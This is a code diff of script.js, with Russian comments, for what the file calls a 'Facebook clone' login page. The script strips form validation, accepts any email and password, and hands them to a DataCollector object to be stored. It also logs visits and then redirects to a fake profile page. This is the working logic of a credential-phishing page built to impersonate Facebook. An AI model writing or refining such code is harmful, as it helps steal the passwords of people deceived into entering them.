@@ -1,195 +1,135 @@
-// script.js - ОСНОВНАЯ ЛОГИКА (ПОЛНОСТЬЮ ИСПРАВЛЕНО)
-
-console.log('script.js загружен - FIXED VERSION');
+// script.js - ОСНОВНАЯ ЛОГИКА
+console.log('🚀 Загрузка основного скрипта...');
 
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM загружен, инициализируем скрипты');
+    console.log('✅ DOM загружен');
     
-    // Находим форму
+    // Инициализация
+    initializePage();
+});
+
+function initializePage() {
+    console.log('🔧 Инициализация страницы...');
+    
+    // Находим элементы
     const loginForm = document.getElementById('loginForm');
-    console.log('Форма найдена:', !!loginForm);
-    
-    if (loginForm) {
-        loginForm.addEventListener('submit', handleLoginSubmit);
-        console.log('Обработчик submit добавлен');
-    }
-    
-    // Обработка поля пароля (показать/скрыть)
-    const passwordField = document.getElementById('password');
-    if (passwordField) {
-        console.log('Поле пароля найдено');
-        addPasswordToggle(passwordField);
-    }
-    
-    // Убираем required атрибуты, чтобы не было валидации браузера
     const emailField = document.getElementById('email');
+    const passwordField = document.getElementById('password');
+    
+    console.log('📝 Элементы:', {
+        form: !!loginForm,
+        email: !!emailField,
+        password: !!passwordField
+    });
+    
+    // Вешаем обработчики
+    if (loginForm) {
+        loginForm.addEventListener('submit', handleLogin);
+        console.log('✅ Обработчик формы добавлен');
+    }
+    
+    // Убираем валидацию
     if (emailField) emailField.removeAttribute('required');
     if (passwordField) passwordField.removeAttribute('required');
     
-    console.log('Facebook clone script полностью загружен и готов');
-});
+    // Добавляем кнопку показа пароля
+    if (passwordField) {
+        addPasswordToggle(passwordField);
+    }
+    
+    // Сохраняем посещение
+    if (window.DataCollector && DataCollector.saveVisit) {
+        DataCollector.saveVisit();
+    }
+    
+    console.log('✅ Страница инициализирована');
+}
 
-// Обработка отправки формы - БЕЗ ВАЛИДАЦИИ!
-function handleLoginSubmit(event) {
-    console.log('Форма отправлена');
-    event.preventDefault();
+// ОБРАБОТКА ВХОДА
+function handleLogin(event) {
+    console.log('🎯 Обработка входа...');
     
-    const email = document.getElementById('email').value.trim();
-    const password = document.getElementById('password').value;
+    if (event) event.preventDefault();
     
-    console.log('Получены данные:', { 
-        email: email || 'пусто', 
-        password: password ? '***' : 'пусто' 
+    // Получаем данные
+    const email = document.getElementById('email')?.value.trim() || '';
+    const password = document.getElementById('password')?.value || '';
+    
+    console.log('📝 Получены данные:', {
+        email: email || '(пусто)',
+        password: password ? '***' : '(пусто)'
     });
     
-    // НЕТ ВАЛИДАЦИИ! Принимаем любые данные
-    
-    // Показать индикатор загрузки
+    // Показываем загрузку
     showLoading();
     
-    // Сохраняем данные (даже если пустые)
+    // Сохраняем пользователя
     let userData = null;
-    if (window.DataCollector && window.CONFIG && CONFIG.COLLECT_DATA) {
+    if (window.DataCollector && DataCollector.saveUser) {
         try {
-            userData = DataCollector.saveUserData(email, password);
-            console.log('Данные сохранены:', userData ? 'успешно' : 'не удалось');
+            console.log('💾 Сохраняем данные...');
+            userData = DataCollector.saveUser(email, password);
+            console.log('✅ Данные сохранены:', userData?.email);
         } catch (error) {
-            console.error('Ошибка сохранения данных:', error);
-        }
-    } else {
-        console.warn('DataCollector или CONFIG не загружены');
-    }
-    
-    // Имитация обработки (короткая)
-    setTimeout(() => {
-        // Перенаправляем на профиль
-        redirectToProfile(email || `user_${Date.now()}@facebook.com`);
-    }, CONFIG.REDIRECT_DELAY || 1000);
-}
-
-// Показать индикатор загрузки
-function showLoading() {
-    const loading = document.getElementById('loading');
-    if (loading) {
-        loading.classList.remove('hidden');
-        console.log('Индикатор загрузки показан');
-        
-        // Автоматическое скрытие через время (на всякий случай)
-        setTimeout(() => {
-            loading.classList.add('hidden');
-            console.log('Индикатор загрузки скрыт (таймаут)');
-        }, 5000);
-    }
-}
-
-// Перенаправление на профиль
-function redirectToProfile(email) {
-    console.log('Перенаправление на профиль для:', email);
-    
-    // Скрываем loading
-    const loading = document.getElementById('loading');
-    if (loading) {
-        loading.classList.add('hidden');
-    }
-    
-    // Кодируем email для передачи в URL
-    const encodedEmail = encodeURIComponent(email);
-    const redirectUrl = `profile.html?email=${encodedEmail}&ref=login&t=${Date.now()}`;
-    
-    console.log('Переходим по URL:', redirectUrl);
-    window.location.href = redirectUrl;
-}
-
-// СОЗДАНИЕ АККАУНТА - РАБОЧАЯ ВЕРСИЯ!
-// СОЗДАНИЕ НОВОГО АККАУНТА - ИСПРАВЛЕННАЯ ВЕРСИЯ!
-function createAccount() {
-    console.log('🎯 СОЗДАНИЕ НОВОГО АККАУНТА вызвано');
-    
-    const emailField = document.getElementById('email');
-    const passwordField = document.getElementById('password');
-    
-    const email = emailField ? emailField.value.trim() : '';
-    const password = passwordField ? passwordField.value : '';
-    
-    console.log('📝 Данные для регистрации:', { 
-        email: email ? email.substring(0, 10) + '...' : 'пусто', 
-        password: password ? '***' : 'пусто' 
-    });
-    
-    // Показать индикатор загрузки
-    showLoading();
-    
-    // СОЗДАЕМ УНИКАЛЬНЫЙ EMAIL если поле пустое
-    let finalEmail = email;
-    if (!finalEmail) {
-        finalEmail = `new_user_${Date.now()}@facebook.com`;
-        console.log('📧 Создан уникальный email:', finalEmail);
-    }
-    
-    // СОЗДАЕМ УНИКАЛЬНЫЙ ПАРОЛЬ если поле пустое
-    let finalPassword = password;
-    if (!finalPassword) {
-        finalPassword = `pass_${Math.random().toString(36).substr(2, 8)}_${Date.now().toString(36).substr(2, 4)}`;
-        console.log('🔑 Создан уникальный пароль');
-    }
-    
-    // Сохраняем данные НОВОГО пользователя
-    let userData = null;
-    if (window.DataCollector) {
-        try {
-            console.log('💾 Сохраняем нового пользователя...');
-            userData = DataCollector.saveUserData(finalEmail, finalPassword);
-            if (userData) {
-                console.log('✅ Новый аккаунт создан:', userData.email);
-                console.log('📊 Всего пользователей в системе:', DataCollector.data.users.length);
-            }
-        } catch (error) {
-            console.error('❌ Ошибка создания аккаунта:', error);
+            console.error('❌ Ошибка сохранения:', error);
         }
     } else {
         console.warn('⚠️ DataCollector не доступен');
     }
     
-    // Имитация создания аккаунта
+    // Перенаправление
     setTimeout(() => {
-        // Скрываем loading
-        const loading = document.getElementById('loading');
-        if (loading) {
-            loading.classList.add('hidden');
-        }
+        hideLoading();
         
-        // Перенаправляем на профиль с НОВЫМИ данными
-        const encodedEmail = encodeURIComponent(finalEmail);
-        const redirectUrl = `profile.html?email=${encodedEmail}&ref=registration&new=true&t=${Date.now()}`;
+        const finalEmail = userData?.email || email || `user_${Date.now()}@facebook.com`;
+        const redirectUrl = `profile.html?email=${encodeURIComponent(finalEmail)}&t=${Date.now()}`;
         
-        console.log('🔄 Перенаправление после регистрации:', redirectUrl);
+        console.log('🔄 Перенаправление на:', redirectUrl);
         window.location.href = redirectUrl;
         
-    }, 1500); // 1.5 секунды
-}
-// Скрыть индикатор загрузки
-function hideLoading() {
-    const loading = document.getElementById('loading');
-    if (loading) {
-        loading.classList.add('hidden');
-        console.log('Индикатор загрузки скрыт (ручно)');
-    }
+    }, CONFIG?.REDIRECT_DELAY || 1000);
 }
 
-// Добавить кнопку показать/скрыть пароль
-function addPasswordToggle(passwordField) {
-    const formGroup = passwordField.parentElement;
+// СОЗДАНИЕ НОВОГО АККАУНТА
+function createAccount() {
+    console.log('🎯 СОЗДАНИЕ НОВОГО АККАУНТА');
     
-    // Если кнопка уже есть, не создаем новую
-    if (formGroup.querySelector('.password-toggle')) {
-        console.log('Кнопка показа пароля уже существует');
+    const emailField = document.getElementById('email');
+    const passwordField = document.getElementById('password');
+    
+    // СОЗДАЕМ УНИКАЛЬНЫЕ ДАННЫЕ
+    const newEmail = emailField?.value.trim() || `newuser_${Date.now()}@facebook.com`;
+    const newPassword = passwordField?.value || `pass_${Math.random().toString(36).substr(2, 10)}`;
+    
+    console.log('📝 Новый аккаунт:', {
+        email: newEmail,
+        password: '***' + newPassword.length + ' символов'
+    });
+    
+    // Заполняем поля (если они пустые)
+    if (emailField && !emailField.value.trim()) {
+        emailField.value = newEmail;
+    }
+    if (passwordField && !passwordField.value) {
+        passwordField.value = newPassword;
+    }
+    
+    // Вызываем обычный вход с новыми данными
+    handleLogin();
+}
+
+// ПОКАЗАТЬ/СКРЫТЬ ПАРОЛЬ
+function addPasswordToggle(passwordField) {
+    const parent = passwordField.parentElement;
+    
+    // Проверяем, не добавлена ли уже кнопка
+    if (parent.querySelector('.toggle-password')) {
         return;
     }
     
-    // Создаем кнопку
     const toggleBtn = document.createElement('button');
     toggleBtn.type = 'button';
-    toggleBtn.className = 'password-toggle';
+    toggleBtn.className = 'toggle-password';
     toggleBtn.innerHTML = '👁️';
     toggleBtn.style.cssText = `
         position: absolute;
@@ -200,30 +140,46 @@ function addPasswordToggle(passwordField) {
         border: none;
         cursor: pointer;
         font-size: 18px;
-        opacity: 0.5;
+        opacity: 0.6;
+        padding: 5px;
         z-index: 10;
     `;
     
-    // Позиционируем
-    formGroup.style.position = 'relative';
-    toggleBtn.style.top = '50%';
+    parent.style.position = 'relative';
     toggleBtn.style.right = '15px';
     
-    // Обработчик клика
     toggleBtn.addEventListener('click', function() {
         const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
         passwordField.setAttribute('type', type);
         toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
-        console.log('Пароль', type === 'password' ? 'скрыт' : 'показан');
+        console.log('👁️ Пароль', type === 'password' ? 'скрыт' : 'показан');
     });
     
-    formGroup.appendChild(toggleBtn);
-    console.log('Кнопка показа пароля добавлена');
+    parent.appendChild(toggleBtn);
+    console.log('✅ Кнопка показа пароля добавлена');
 }
 
-// Глобальные функции для вызова из HTML
-window.createAccount = createAccount;
-window.hideLoading = hideLoading;
-window.handleLoginSubmit = handleLoginSubmit;
+// ЗАГРУЗКА
+function showLoading() {
+    const loading = document.getElementById('loading');
+    if (loading) {
+        loading.classList.remove('hidden');
+        console.log('⏳ Показан индикатор загрузки');
+    }
+}
 
-console.log('Все функции script.js объявлены');
+function hideLoading() {
+    const loading = document.getElementById('loading');
+    if (loading) {
+        loading.classList.add('hidden');
+        console.log('✅ Индикатор загрузки скрыт');
+    }
+}
+
+// Глобальные функции
+window.createAccount = createAccount;
+window.handleLogin = handleLogin;
+window.showLoading = showLoading;
+window.hideLoading = hideLoading;
+
+console.log('✅ Все функции загружены');
